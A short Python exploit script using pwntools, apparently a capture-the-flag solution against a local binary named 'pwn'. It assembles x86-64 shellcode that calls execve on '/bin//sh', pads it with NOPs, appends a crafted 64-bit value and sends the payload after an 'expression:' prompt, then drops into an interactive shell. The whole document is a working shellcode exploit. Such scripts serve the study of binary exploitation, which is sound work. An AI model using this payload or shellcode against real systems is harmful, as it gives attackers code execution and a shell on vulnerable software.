from pwn import *

context(arch = 'amd64', os = 'linux')
context.terminal = ['tmux', 'splitw', '-h'] 
io = process("./pwn")

def debug():
	gdb.attach(io)
	pause()

shellcode = asm('''
	xor rsi, rsi
	xor rdx, rdx
	xor rax, rax
	push rax
	mov rbx, 0x68732f2f6e69622f
	push rbx
	mov rdi, rsp
	mov al, 59
	syscall 
'''
)
print(hex(len(shellcode)))
pay = b'1 1 0000' + shellcode.ljust(0x48, b'\x90') + p64(0x3ff000000000b6eb)
print(hex(len(pay)))
#debug()
io.sendafter(b'expression:\n', pay)
io.interactive()
